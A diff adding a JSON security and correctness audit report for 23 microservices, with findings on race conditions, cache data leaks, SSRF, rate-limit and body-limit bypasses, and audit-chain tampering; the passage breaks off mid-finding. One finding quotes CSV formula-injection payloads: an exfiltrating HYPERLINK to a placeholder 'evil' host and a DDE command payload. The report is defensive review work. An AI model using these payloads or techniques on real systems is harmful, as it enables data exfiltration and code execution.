@@ -1,0 +1,1396 @@
+{
+  "generated": "2026-09-12",
+  "run_id": "wf_78acbb8c-b73",
+  "service_count": 23,
+  "total_issues": 119,
+  "summary": [
+    {
+      "service": "analytics-service",
+      "count": 6,
+      "by_severity": {
+        "high": 2,
+        "medium": 3,
+        "low": 1
+      }
+    },
+    {
+      "service": "api-gateway",
+      "count": 5,
+      "by_severity": {
+        "high": 2,
+        "medium": 2,
+        "low": 1
+      }
+    },
+    {
+      "service": "assistant-service",
+      "count": 4,
+      "by_severity": {
+        "medium": 3,
+        "low": 1
+      }
+    },
+    {
+      "service": "audit-service",
+      "count": 7,
+      "by_severity": {
+        "high": 2,
+        "medium": 4,
+        "low": 1
+      }
+    },
+    {
+      "service": "authz-service",
+      "count": 3,
+      "by_severity": {
+        "medium": 2,
+        "low": 1
+      }
+    },
+    {
+      "service": "backup-service",
+      "count": 4,
+      "by_severity": {
+        "high": 3,
+        "medium": 1
+      }
+    },
+    {
+      "service": "billing-service",
+      "count": 4,
+      "by_severity": {
+        "high": 3,
+        "medium": 1
+      }
+    },
+    {
+      "service": "compliance-service",
+      "count": 5,
+      "by_severity": {
+        "high": 1,
+        "medium": 3,
+        "low": 1
+      }
+    },
+    {
+      "service": "connector-service",
+      "count": 7,
+      "by_severity": {
+        "high": 3,
+        "medium": 4
+      }
+    },
+    {
+      "service": "feature-flag-service",
+      "count": 5,
+      "by_severity": {
+        "high": 1,
+        "medium": 2,
+        "low": 2
+      }
+    },
+    {
+      "service": "file-service",
+      "count": 6,
+      "by_severity": {
+        "high": 1,
+        "medium": 2,
+        "low": 3
+      }
+    },
+    {
+      "service": "identity-service",
+      "count": 3,
+      "by_severity": {
+        "high": 1,
+        "medium": 1,
+        "low": 1
+      }
+    },
+    {
+      "service": "job-service",
+      "count": 5,
+      "by_severity": {
+        "high": 2,
+        "medium": 3
+      }
+    },
+    {
+      "service": "notification-service",
+      "count": 3,
+      "by_severity": {
+        "high": 1,
+        "medium": 2
+      }
+    },
+    {
+      "service": "onboarding-service",
+      "count": 6,
+      "by_severity": {
+        "high": 2,
+        "medium": 3,
+        "low": 1
+      }
+    },
+    {
+      "service": "search-service",
+      "count": 8,
+      "by_severity": {
+        "critical": 1,
+        "high": 4,
+        "medium": 2,
+        "low": 1
+      }
+    },
+    {
+      "service": "stream-service",
+      "count": 7,
+      "by_severity": {
+        "high": 1,
+        "medium": 4,
+        "low": 2
+      }
+    },
+    {
+      "service": "tenant-service",
+      "count": 5,
+      "by_severity": {
+        "high": 1,
+        "medium": 1,
+        "low": 3
+      }
+    },
+    {
+      "service": "ticket-service",
+      "count": 6,
+      "by_severity": {
+        "high": 1,
+        "medium": 3,
+        "low": 2
+      }
+    },
+    {
+      "service": "verification-service",
+      "count": 5,
+      "by_severity": {
+        "high": 1,
+        "medium": 3,
+        "low": 1
+      }
+    },
+    {
+      "service": "wallet-service",
+      "count": 6,
+      "by_severity": {
+        "medium": 4,
+        "low": 2
+      }
+    },
+    {
+      "service": "webhook-service",
+      "count": 5,
+      "by_severity": {
+        "high": 2,
+        "medium": 1,
+        "low": 2
+      }
+    },
+    {
+      "service": "zatca-service",
+      "count": 4,
+      "by_severity": {
+        "high": 1,
+        "medium": 2,
+        "low": 1
+      }
+    }
+  ],
+  "services": [
+    {
+      "service": "analytics-service",
+      "issues": [
+        {
+          "category": "correctness",
+          "severity": "high",
+          "file": "app/core/ingest_service.py",
+          "line": 105,
+          "title": "Rollup read-modify-write has no CAS/lock: concurrent ingests lose increments (undercount)",
+          "detail": "_update_rollups does `r = await self._rollups.get(key) or new(...)`, mutates r.count/r.sum/r.hll/r.hist, then `await self._rollups.put(r)` (stores.RollupStore.put is a plain overwrite). There is an await between the read and the write, so on the single-worker event loop two ingests targeting the same (tenant, metric, granularity, bucket, dims) cell interleave: both read the same base rollup, both increment from it, and the second put overwrites the first. Increments (and HLL/histogram merges) are silently lost. No optimistic-concurrency check, version, or lock exists anywhere in the path.",
+          "failure_scenario": "Two 'checkout.completed' events for the same tenant/hour arrive concurrently (normal for an at-least-once bus draining a backlog). Both read count=10, both write count=11. Final count is 11 instead of 12; a revenue `sum` rollup similarly undercounts, so reported totals/MRR are lower than reality."
+        },
+        {
+          "category": "correctness",
+          "severity": "high",
+          "file": "app/core/ingest_service.py",
+          "line": 72,
+          "title": "Idempotency check and mark_seen are not atomic: concurrent redelivery double-counts",
+          "detail": "ingest() does `if await self._events.seen(event_id): return duplicate` at line 72, but only calls `mark_seen(event_id)` at line 84 after add() and before _update_rollups. seen() is a get on the `event_seen` collection and mark_seen is a separate put; there is no atomic test-and-set. Two concurrent deliveries of the SAME event_id both evaluate seen()==False, both proceed, and both run _update_rollups, defeating the module's stated 'a duplicate performs zero additional writes' guarantee.",
+          "failure_scenario": "The at-least-once EventBus redelivers a payment event (same id) twice within the same window (retry + original). Both requests pass the seen() gate, both increment the count and add `value` to the sum rollup, double-counting revenue -> wrong MRR, exactly the failure the file header warns against."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/stores.py",
+          "line": 38,
+          "title": "Funnel/retention silently truncate at 100k events, computing over an arbitrary subset",
+          "detail": "QueryService.funnel and QueryService.retention call self._events.for_tenant(tenant), which caps at _EXPORT_MAX=100_000 rows (oldest-first) and returns out[:limit] with no signal that data was cut off. Unlike QueryService.query, the funnel/retention routes never call query.validate, so the request time range is not bounded either. For a tenant with more than 100k events, the funnel/retention is computed over only the oldest 100k events, ignoring everything after — a wrong conversion/retention number returned as if authoritative.",
+          "failure_scenario": "A busy tenant has 250k events in the requested range. run_funnel loads only the oldest 100k, so subjects whose journey lives in the newer 150k are dropped; the funnel reports far fewer entrants/conversions than actually occurred, with no error or truncation flag."
+        },
+        {
+          "category": "perf",
+          "severity": "medium",
+          "file": "app/api/v1/analytics.py",
+          "line": 105,
+          "title": "Funnel/retention routes have no time-range cap and load up to 100k rows per request into memory",
+          "detail": "run_query enforces MAX_QUERY_RANGE_DAYS via query.validate, but run_funnel (line 105) and run_retention (line 113) pass start/end straight through with no range validation. Their service methods read the whole per-tenant event set (for_tenant, up to 100k rows deep-copied by the memory store / full paginated find on postgres), then sort and group in Python per subject. These are authenticated read routes reachable by any principal with analytics.read.",
+          "failure_scenario": "A caller repeatedly posts /funnel or /retention with a wide range against a large tenant; each call pulls and deep-copies ~100k event dicts and does O(events log events) Python work, pinning the single-worker event loop and starving other requests (DoS-by-cost)."
+        },
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "app/api/v1/analytics.py",
+          "line": 197,
+          "title": "Export audit record logs the caller's own tenant, not the tenant whose data was exported",
+          "detail": "export_query records the audit event with `tenant=p.tenant` (line 197), but the actual export runs against `_tenant(p, body.tenant)` (line 202). For a platform principal (`platform.analytics` in caps) `_tenant` returns the requested body.tenant, so a platform operator can export tenant X's analytics while the audit trail attributes the export to the operator's own tenant (or None). The write-ahead audit therefore misrecords which tenant's data left the system.",
+          "failure_scenario": "A platform support user exports tenant 'acme' data via /export with body.tenant='acme'. The audit log stores tenant=<operator tenant or empty>, so a later compliance review of who exported acme's data finds no record against acme — a cross-tenant data-egress event is mis-attributed."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/core/ingest_service.py",
+          "line": 111,
+          "title": "Monetary value stored and summed as float, accumulating rounding error in revenue rollups",
+          "detail": "Event.value is a float, and _update_rollups does `r.sum += float(value)` accumulated across every event in a bucket, with the `sum`/`avg`/`percentile` aggregations returning floats directly. On a money/billing platform, summing binary floats over many events introduces representation/rounding drift in revenue-style metrics (the codebase's own standards flag float money as a defect class).",
+          "failure_scenario": "A tenant records many currency `value`s (e.g. 0.10, 0.20, ...) into one rollup bucket; the accumulated float `sum` diverges from the exact decimal total, so exported/queried revenue figures are off by fractions that compound at scale and never reconcile against the source-of-truth ledger."
+        }
+      ]
+    },
+    {
+      "service": "api-gateway",
+      "issues": [
+        {
+          "category": "security",
+          "severity": "high",
+          "file": "services/api-gateway/app/core/gateway.py",
+          "line": 106,
+          "title": "Response cache leaks per-user (auth=optional) responses to other callers",
+          "detail": "cacheable = request.method == 'GET' and route.auth != 'required' and ttl > 0. This includes auth=='optional' routes. On an optional-auth route the gateway DOES verify the bearer token and forwards identity to the upstream (X-User-Id/X-Tenant-Id/X-Caps, lines 151-154), so the upstream returns per-user/per-tenant data. But the cache key (line 107: 'gw:{method}:{path}?{query}') contains NO identity, and the 2xx response is stored (lines 129-130) and replayed verbatim to any subsequent caller of the same path (including anonymous ones), together with all upstream response headers (Set-Cookie included). The response cache does not vary on Authorization/user/tenant.",
+          "failure_scenario": "A route configured auth='optional', cache_ttl>0. User A (Bearer token) GETs /api/v1/<res>/me -> upstream returns A's private data -> gateway caches it under 'gw:GET:/api/v1/<res>/me?'. User B (or an anonymous client) GETs the same path within TTL -> served A's cached private data (and any Set-Cookie) from cache. Cross-user/cross-tenant data disclosure + cache poisoning."
+        },
+        {
+          "category": "security",
+          "severity": "high",
+          "file": "services/api-gateway/app/core/gateway.py",
+          "line": 72,
+          "title": "Proxy hot path bypasses the rate-limit policy; buckets by socket IP only",
+          "detail": "The catch-all proxy (api/proxy.py:38-40) carries no rate_limit dependency, and grep confirms the policy-driven limiter (api/ratelimit.py:rate_limit) is never attached to any route — main.py only wires register_ratelimit_refund + build_policy. So on the gateway's PRIMARY traffic path, rate limiting is only Gateway.handle's rl_key = f'ip:{client.host}' (lines 72-73) with the default budget; RATELIMIT_KEY_PARTS, RATELIMIT_ROUTES (per-route class/limit/cost), and RATELIMIT_COUNT_STATUSES config are entirely unread for proxied traffic. request.client.host is the socket peer (no X-Forwarded-For handling anywhere), which behind a k3s ingress/NAT collapses all clients into one shared source IP.",
+          "failure_scenario": "Deployed behind an ingress: every proxied request presents the ingress pod IP, so all tenants share ONE bucket keyed 'ip:<ingress-ip>'. One noisy client exhausts RATELIMIT_MAX (default 100/60s) and every other customer gets 429 (fail-closed at lines 77-78 makes any limiter error 429 everyone too). Simultaneously per-endpoint stricter classes (e.g. auth limit 10) and subject/tenant fairness never apply. Availability + ineffective abuse protection on the money/auth platform edge."
+        },
+        {
+          "category": "vuln",
+          "severity": "medium",
+          "file": "services/api-gateway/app/middleware/security.py",
+          "line": 71,
+          "title": "Body-size limit bypassed by chunked requests (no Content-Length)",
+          "detail": "BodyLimitMiddleware only enforces max_bytes when the Content-Length header is present (line 71: 'if content_length is not None'). A request using Transfer-Encoding: chunked (no Content-Length) skips the check entirely, and Gateway.handle then does body = await request.body() (gateway.py:121), buffering the entire request body into memory before forwarding.",
+          "failure_scenario": "Attacker sends a chunked POST with a multi-GB body and no Content-Length to any proxied route. BodyLimitMiddleware waves it through; the gateway reads the whole stream into RAM, exhausting the single-worker pod's memory (OOM / DoS). The advertised body cap provides no protection against the streaming case."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "services/api-gateway/app/core/gateway.py",
+          "line": 129,
+          "title": "Gateway cache ignores upstream Cache-Control / Set-Cookie / Vary",
+          "detail": "For a cacheable route the gateway caches any 2xx GET response (lines 129-130) with no regard for the upstream's own caching directives. It does not honor Cache-Control: no-store/private/no-cache, does not skip responses carrying Set-Cookie, and does not apply Vary. The upstream's explicit instruction that a response must not be shared/stored is silently overridden.",
+          "failure_scenario": "An upstream returns a GET response marked 'Cache-Control: private, no-store' (or with a Set-Cookie) on an auth=none/optional cached route. The gateway caches and replays it to other clients for the full TTL, defeating the upstream's caching contract and potentially sharing per-request state."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "services/api-gateway/app/api/authz.py",
+          "line": 23,
+          "title": "require_capability uses exact match, disagreeing with wildcard-aware catalog filter",
+          "detail": "require_capability (authz.py:23-27) gates with exact membership 'all(c in held for c in caps)' and has no wildcard support, whereas the admin/app catalog filters actions with capmatch.holds (wildcard-aware: '*' and 'a.b.*'). The admin panel's open-gate _cap_gate() = require_capability(ADMIN_CATALOG_CAP) (admin.py:30-31,44) therefore diverges from the catalog's own filtering. This is the exact catalog-vs-enforcement drift the codebase introduced capmatch to prevent (see gateway.py:96-102, which was migrated to holds_any for this reason) but authz.py was not migrated.",
+          "failure_scenario": "A platform operator whose token grants 'platform.*' (or '*') opens the admin panel. capmatch.holds({'platform.*'}, ADMIN_CATALOG_CAP) is True so build_catalog would show them every action, but require_capability(ADMIN_CATALOG_CAP) does 'ADMIN_CATALOG_CAP in {\"platform.*\"}' -> False -> 403, locking a legitimately-privileged admin out of the panel."
+        }
+      ]
+    },
+    {
+      "service": "assistant-service",
+      "issues": [
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/conversations.py",
+          "line": 247,
+          "title": "Retention sweeper scans only a fixed key-ordered prefix, so old rows past it are never purged",
+          "detail": "enforce_retention() does a single `rows = await self._s.scan_all(_CONVERSATIONS, limit)` (default limit=500) with NO pagination loop. Both datastore backends implement scan_all deterministically: postgres is `SELECT value ... ORDER BY key LIMIT $2`, memory takes the first N by insertion. So every cron run examines the SAME lowest-key prefix. Rows within the prefix that are newer than the cutoff are skipped and permanently occupy prefix slots; any conversation whose key sorts beyond that prefix is never read and therefore never deleted, no matter how old it gets. CONVERSATION_RETENTION_DAYS is silently not enforced for those rows — personal data retained past policy, the exact compliance defect the module docstring claims to prevent.",
+          "failure_scenario": "A tenant accumulates >500 conversations; 500 recent (within-retention) rows have the lowest uuid keys. A conversation older than 90 days whose key sorts at position 600 is examined by no run and is retained indefinitely, while the audit line reports the purge 'succeeded'."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/main.py",
+          "line": 126,
+          "title": "Per-tenant model credential is silently ignored on the /ask path",
+          "detail": "container.model.use_key_resolver(app.state.model_credentials.get) wires ModelCredentials.get (signature `async def get(self, tenant='')`) as the adapter's KeyResolver, which HttpModel._credential() invokes with NO arguments (`await self._key_resolver()`). So get() always runs with tenant='' and SecretStore.get() only ever checks the platform-wide row then the env fallback, never the tenant-scoped row. The operator panel (operator.py set_secret / SecretIn.tenant) accepts a tenant, reports success, audits it, and _invalidate() clears that tenant's cache entry — but the KB /ask path never reads it. A tenant that configured its own MODEL_API_KEY keeps being served and billed on the platform key.",
+          "failure_scenario": "Operator PUTs /operator/secrets {name: MODEL_API_KEY, value: <tenantB key>, tenant: tenantB}; response says set + rotating. Every /ask from tenantB still authenticates with the platform key (or env), so tenantB's provider key is dead and its usage bills the platform account."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/api/internal.py",
+          "line": 128,
+          "title": "Advisory triage/draft can 500 the caller on a provider failure",
+          "detail": "internal_triage and internal_draft call support.triage/support.draft, which call model.answer(...). HttpModel.answer raises ModelError on any transport/HTTP-non-200/empty-text condition (http_provider.py lines 481-494). Neither support.py nor the internal routes catch ModelError, so a provider outage/rate-limit propagates as an unhandled 500. This violates the stated contract (support.py docstring: 'ADVISORY ... a failed suggestion must never fail the ticket'; the caller is documented to treat a null/empty result as a shrug). The sibling connection route (invoke_connection) correctly wraps ModelError -> 502, showing the intended handling is missing here.",
+          "failure_scenario": "ticket-service POSTs /internal/assistant/triage while the LLM endpoint returns HTTP 429; model.answer raises ModelError, it bubbles out of internal_triage as a 500, and the ticket-service call fails instead of proceeding with 'no suggestion'."
+        },
+        {
+          "category": "security",
+          "severity": "low",
+          "file": "app/api/internal.py",
+          "line": 234,
+          "title": "AI-connection URL is unvalidated (SSRF) and requests carry a credential to it",
+          "detail": "create_connection/update_connection accept an arbitrary conn.url (only length-bounded) and _conn_model builds HttpModel(conn.url, ...) which POSTs to it with the connection's Authorization/x-api-key header (and, for auth=vertex, a freshly minted GCP OAuth token). There is no scheme allowlist, no host allowlist, and no block on link-local/metadata/private addresses (e.g. http://169.254.169.254/, http://<internal-svc>). The invoke response body is parsed and returned. This is gated behind internal-tier auth and the creator supplies the credential, which limits blast radius, but any principal that can reach the /internal tier can make the service issue outbound requests to arbitrary internal/cloud endpoints.",
+          "failure_scenario": "An internal caller creates a connection with url=http://internal-admin.svc.cluster.local/ and invokes it; assistant-service issues the request from inside the cluster and returns whatever parses as a model response, reaching services not otherwise exposed."
+        }
+      ]
+    },
+    {
+      "service": "audit-service",
+      "issues": [
+        {
+          "category": "correctness",
+          "severity": "high",
+          "file": "services/audit-service/app/core/audit_service.py",
+          "line": 50,
+          "title": "record() reads head then appends non-atomically — concurrent appends corrupt the tamper-evident chain",
+          "detail": "record() does `seq, head = await self._repo.head(partition)` (line 50) and then `await self._repo.append(...)` (line 57) with no lock, transaction, or CAS between them. Both head() and append() acquire independent asyncpg connections that suspend on real I/O, so two concurrent record()/ingest calls to the same partition interleave: both read the same head seq/head_hash, both build an event with seq+1 and prev_hash=head, both append. The result is two events sharing the same seq and prev_hash, and audit_meta ends up pointing at whichever wrote last. verify() then reports the chain broken (prev_hash mismatch), and one of the two events is effectively orphaned. record_idempotent() only serializes writes that carry the SAME idempotency_key; two distinct events (the normal ingest case, and every self-audit record() call) have no protection at all. This defeats the core guarantee of the service under any real concurrency (postgres, or multiple workers/pods).",
+          "failure_scenario": "Two services POST /internal/audit concurrently (no idempotency_key, or different keys) for the same partition. Both read head seq=100, both append seq=101 chained to the same prev_hash; audit_meta is left at seq=101. A later GET /internal/audit/verify walks the chain, finds two seq=101 rows / a prev_hash mismatch, and returns ok:false — a false tamper alarm, and one real audit event is lost from the linked chain."
+        },
+        {
+          "category": "perf",
+          "severity": "high",
+          "file": "services/audit-service/app/core/audit_repository.py",
+          "line": 146,
+          "title": "Audit queries order by `_seq_key`, which no Postgres index covers — every query/verify full-scans and sorts the partition",
+          "detail": "query() and iterate() call datastore.find(..., sort=(\"_seq_key\", \"desc\"/\"asc\")) (audit_repository.py lines 72 and 146). The Postgres adapter's only ordering index is kv_created_desc ON (collection, COALESCE(value->>'created',''), key) (postgres.py lines 33-34), keyed on the field 'created'. AuditEvent has no 'created' field (models.py) — its sort field is '_seq_key'. So find() emits `ORDER BY COALESCE(value->>'_seq_key','') DESC, key DESC` with no matching index, and the keyset cursor comparison `(COALESCE(value->>'_seq_key',''), key) < (...)` is likewise unindexed. Postgres must GIN-match the partition then Sort every matching row for each page. With the default AUDIT_PARTITION=global (config.py:286) ALL events live in one partition, so every audit query, every export page, and every full-chain verify()/iterate() sorts the entire event table — O(all events), exactly the behaviour the adapter's own comment says only the matched index avoids. The paging is defeated too: each 'next page' re-sorts from scratch instead of seeking.",
+          "failure_scenario": "With a few million events in the global partition, a single GET /api/v1/audit or a scheduled /internal/audit/verify forces a full bitmap heap scan + top-N sort of the whole table per page; verify() (which pages to exhaustion at 500 rows/page) re-sorts the full table on every one of thousands of pages, driving query latency and DB CPU to the point the audit read path times out."
+        },
+        {
+          "category": "security",
+          "severity": "medium",
+          "file": "services/audit-service/app/config.py",
+          "line": 283,
+          "title": "Default integrity driver is unkeyed sha256 hash-chain — defeatable by anyone with datastore write access",
+          "detail": "INTEGRITY_DRIVER defaults to \"hash-chain\" (config.py:283), i.e. HashChainIntegrity.seal = sha256(prev_hash + canonical(event)) with NO secret key (adapters/integrity/hash_chain.py:14). The chain is 'tamper-evident' only against an adversary who cannot recompute the hashes — but with an unkeyed hash, anyone who can write to the audit datastore (a compromised DB account, a rogue operator, a SQL-level attacker) can delete or edit events and re-anchor the entire chain exactly as purge() does (audit_service.py:304-312), producing a chain that passes verify() cleanly. The threat model for an audit log IS someone with backend access covering their tracks; the default provides no protection against it. Only the opt-in hmac-chain driver (requires INTEGRITY_HMAC_KEY, held outside the DB) actually resists this, and it is not the default.",
+          "failure_scenario": "An attacker who gains write access to the kv_store table deletes the events recording their privileged actions, recomputes prev_hash/hash for all following events with public sha256, and updates audit_meta head. GET /internal/audit/verify returns ok:true — the log now proves a tampered history is intact."
+        },
+        {
+          "category": "vuln",
+          "severity": "medium",
+          "file": "services/audit-service/app/adapters/exporter/csv_exporter.py",
+          "line": 20,
+          "title": "CSV export is vulnerable to spreadsheet formula injection (CWE-1236)",
+          "detail": "CsvExporter.export writes attacker-influenced fields (service, action, resource, tenant, and the JSON-serialised metadata) straight into CSV cells with no neutralisation of leading formula characters =, +, -, @ (lines 20-23). Audit events are recorded by other services via POST /internal/audit with a caller-supplied resource/action/metadata (internal.py AuditIn, max_length only). When an operator opens the exported audit-export file in Excel/Sheets, a cell beginning with '=' or '@' is evaluated as a formula, enabling data exfiltration or command execution via DDE. actor is folded to a sub_ pseudonym so it is safe, but resource/metadata are not.",
+          "failure_scenario": "A service (or a compromised caller) records an event with resource set to `=HYPERLINK(\"http://evil/\"&A1,\"click\")` or `=cmd|'/c calc'!A1`. A platform.audit operator exports and opens the CSV; the formula runs in their spreadsheet, leaking adjacent audit rows or executing a payload on the analyst's machine."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "services/audit-service/app/core/backup.py",
+          "line": 196,
+          "title": "backup import with into_tenant rewrites the hashed `tenant` field on audit events, breaking the restored chain",
+          "detail": "import_archive remaps the tenant field on any row that carries one: `if into_tenant and \"tenant\" in row: row = {**row, \"tenant\": into_tenant}` (lines 196-199). The trigger is the mere presence of a 'tenant' field, not the manifest's tenant_scoped flag. audit_events is declared tenant_scoped:False (backup_manifest.py:30) precisely because the chain spans all tenants, yet every audit event row DOES carry a 'tenant' field (models.py). So a restore-as-clone into a tenant rewrites tenant on every event — but tenant is part of the canonical payload the hash is computed over (integrity/common.py:11), so the stored hash no longer matches the row, and every remapped event fails verify() ('content tampered'). The event's _partition and the audit_meta head are also not remapped, so in tenant-partition mode the restored events are unqueryable and the head is inconsistent. A backup feature silently corrupts the very chain the service exists to protect.",
+          "failure_scenario": "An operator restores an audit archive into a sandbox with into_tenant=\"t-sandbox\". Every audit event's tenant is rewritten to t-sandbox while its hash is unchanged; GET /internal/audit/verify on the restore reports ok:false with the first remapped event flagged as content-tampered, and the clone is unusable."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "services/audit-service/app/core/audit_service.py",
+          "line": 101,
+          "title": "Stale idempotency take-over is a plain put, not atomic — allows a duplicate audit event under a key",
+          "detail": "In record_idempotent(), when a reservation fails because a prior 'pending' entry exists and is judged stale, the code calls idempo_take_over(ns_key, ts) — a plain unconditional put (audit_repository.py:104-107, 'Safe as a plain put') — and then appends (audit_service.py:99-103). Unlike idempo_reserve (an atomic put_if_absent / ON CONFLICT DO NOTHING), take_over has no CAS. If the original reserver crashed and TWO retries with the same key both pass the `ts - cur.ts >= stale_seconds` check concurrently, both call take_over and both proceed to record(), appending TWO distinct events to the chain for one idempotency key — the silent-duplicate outcome the whole mechanism exists to prevent (see the module's own docstring). idempo_commit then just overwrites, so the receipt returned points at only one of the two committed events.",
+          "failure_scenario": "Reserver process crashes mid-append leaving a stale 'pending' key. The sink retries twice concurrently after stale_seconds; both reclaim via the non-atomic take_over and both append. The tamper-evident chain now contains two events for one logical action, and the idempotency receipt references only one — a duplicated, partially-orphaned audit record."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "services/audit-service/app/core/erasure.py",
+          "line": 52,
+          "title": "Erasure ack verifies the hardcoded 'global' partition, ignoring tenant partition mode",
+          "detail": "AuditErasure.erase() takes partition default 'global' (line 46) and calls self._audit.verify(partition) (line 52), and the /internal/privacy/erase caller never passes a partition (internal.py:255). When AUDIT_PARTITION=tenant, the subject's events live in the tenant's own partition, not 'global' (which may be empty or nonexistent). So chain_verifies in the DSAR ack reflects a partition unrelated to the erased subject — reporting the chain intact by checking the wrong (possibly empty) chain, which verify() treats as trivially ok. The proof the ack advertises ('PROVE the chain still verifies') is meaningless in tenant mode.",
+          "failure_scenario": "Platform runs AUDIT_PARTITION=tenant. A DSAR erase for tenant t1's subject returns chain_verifies:true, but verify() ran against the empty 'global' partition and never touched t1's chain — a compliance ack that proves nothing about the data it claims to have retained intact."
+        }
+      ]
+    },
+    {
+      "service": "authz-service",
+      "issues": [
+        {
+          "category": "security",
+          "severity": "medium",
+          "file": "app/api/v1/authz.py",
+          "line": 165,
+          "title": "Cross-tenant admin mutations recorded under the operator's own tenant, not the affected tenant",
+          "detail": "update_role (line 165), delete_role (line 180), create_policy (line 197) and delete_policy (line 231) all pass tenant=principal.tenant to auditor.record(). For a platform operator (holds `platform.authz`), _guard_tenant() short-circuits and permits editing/deleting another tenant's role or policy, and create_policy writes to _op_tenant(principal, body.tenant) which for an operator honors body.tenant (a different tenant). But the audit event is filed under principal.tenant (the operator's), so the AFFECTED tenant's audit trail contains no record of the change to its own authorization config. This is inconsistent with create_role (lines 130-133), which was explicitly fixed to record under the object's real tenant (`tenant = _op_tenant(...)`) precisely to avoid this class of misattribution. Legitimate platform-admin cross-tenant actions are supposed to be audited to the tenant they touch.",
+          "failure_scenario": "A platform operator (caps include platform.authz) calls DELETE /api/v1/policies/{id} for a policy owned by tenant 'acme'. The action succeeds; the audit event is recorded with tenant=<operator's tenant> instead of 'acme'. When acme (or a compliance officer) later pulls acme's audit trail, the deletion of acme's security policy is absent — an unattributable, invisible change to a tenant's authz configuration."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/adapters/policy/abac.py",
+          "line": 51,
+          "title": "Caller-supplied ABAC attributes can shadow the authoritative subject.id/action/resource.id via setdefault",
+          "detail": "_context() builds the ABAC evaluation context as `base = dict(ctx.get('attributes') or {})` then uses base.setdefault('subject.id', ...), base.setdefault('action', ...), base.setdefault('resource.id', ...). Because setdefault only fills a key when ABSENT, any attribute key already present in the caller-supplied `attributes` map (from CheckIn.attributes on POST /internal/authz/check) wins over the trusted values the PDP derives from subject/action/resource. Conditions frequently compare a resource attribute to `$subject.id` (see conditions.py doc example {'attr':'resource.owner','op':'eq','value':'$subject.id'}); _resolve_value resolves `$subject.id` from this same shadowable dict. Any attribute that is user-influenced and happens to carry the reserved keys silently overrides the real principal, so an ownership/identity condition evaluates against attacker-chosen values instead of the authenticated subject.",
+          "failure_scenario": "A caller performs an authz check whose attributes include {\"subject.id\":\"victim\",\"resource.owner\":\"victim\"} while the real subject is \"attacker\". An ABAC allow policy with condition {attr:resource.owner, op:eq, value:$subject.id} matches (victim==victim), granting the attacker access to a resource whose ownership check should have failed. The reserved keys should be set with override, not setdefault, so the PDP's own values always win."
+        },
+        {
+          "category": "security",
+          "severity": "low",
+          "file": "app/middleware/security.py",
+          "line": 71,
+          "title": "Body size limit enforced only via Content-Length; chunked/streamed bodies bypass it",
+          "detail": "BodyLimitMiddleware.dispatch only inspects the Content-Length header and rejects when it exceeds max_bytes. A request sent with Transfer-Encoding: chunked (or otherwise omitting Content-Length) has content_length is None and is passed straight through to call_next with no cap, and nothing downstream re-enforces BODY_LIMIT_BYTES by counting streamed bytes. The stated purpose (CWE-400 resource abuse) is only partially met — an attacker who omits Content-Length can stream an arbitrarily large body.",
+          "failure_scenario": "A client POSTs to any route with Transfer-Encoding: chunked and a multi-hundred-MB body and no Content-Length header. BodyLimitMiddleware sees content_length is None, skips the check, and the oversized body is read and buffered by the framework, defeating the 1 MiB BODY_LIMIT_BYTES guard and enabling a memory-exhaustion DoS."
+        }
+      ]
+    },
+    {
+      "service": "backup-service",
+      "issues": [
+        {
+          "category": "bug",
+          "severity": "high",
+          "file": "app/core/runs.py",
+          "line": 32,
+          "title": "recent() returns the OLDEST rows, not the newest — 'latest run' is actually the earliest",
+          "detail": "recent(limit) does `scan_all(_COLL, limit)` then sorts and takes [:limit]. But scan_all is bounded and deterministically ordered by KEY ascending (postgres: `ORDER BY key LIMIT n`; memory: insertion order sliced). Run ids are `run_<UTC-timestamp>` so key-ascending == chronological, meaning scan_all returns the n OLDEST rows. Sorting those newest-first still only yields the newest among the oldest n. When total rows > limit the genuinely newest runs are never fetched. Worst with recent(1): scan_all(coll,1) returns the single oldest run. internal.py:295 `tenant_coverage` uses `recent(1)` as 'the latest run', and drill._latest_verified / health staleness all read recent(). Same defect in RestoreStore.recent (restores.py:29) and DrillStore.recent (drills.py:28).",
+          "failure_scenario": "A tenant has 50 backup runs. Operator calls GET /internal/backup/tenant-coverage?tenant=shopX with no run id. recent(1) returns run #1 (the oldest, weeks-old, possibly before shopX existed). The dispute-defense answer reports 'not covered / not verified' for a tenant whose data is in fact backed up and verified in the newest run — a false negative used in a legal/case timeline. Symmetrically, an old run where a service failed makes health/tenant-coverage report stale/critical while current backups are green."
+        },
+        {
+          "category": "correctness",
+          "severity": "high",
+          "file": "app/core/restore.py",
+          "line": 190,
+          "title": "Per-tenant restore takes a tenant-scoped snapshot but performs a WHOLE-SERVICE overwrite — undo cannot roll back",
+          "detail": "In _restore_one the `tenant` argument is used ONLY to scope the pre-restore snapshot (_snapshot -> export {'tenant': tenant}, restore.py:225-227). The actual restore reads the full stored run archive (result['archive_key']) and POSTs it to the target's /internal/backup/import with `overwrite` and `into_tenant` but NO tenant filter (restore.py:198-209). import_archive (core/backup.py:125) has no tenant filter either. So a run captured whole-service (run_backup_now default tenant='') is always restored across ALL tenants, while the operator-supplied `tenant` (echoed by plan() but never used to filter, restore.py:99-125) implies scoping that does not occur. Because the safety snapshot only captured one tenant, undo() (restore.py:237) re-applies only that tenant's snapshot.",
+          "failure_scenario": "Operator restores whole-service run R with tenant='shopX', overwrite=True, safety_snapshot=True, believing only shopX is affected. import overwrites every tenant's rows from the archive. The restore turns out wrong; operator calls undo, which only restores shopX's snapshot. All OTHER tenants' rows overwritten by the restore are permanently lost, despite Rule 2's 'snapshot before you overwrite / a restore you cannot roll back' guarantee."
+        },
+        {
+          "category": "security",
+          "severity": "high",
+          "file": "app/core/internal_http.py",
+          "line": 30,
+          "title": "SSRF egress allowlist fails OPEN by default, enabling internal-token/secret exfiltration to any host",
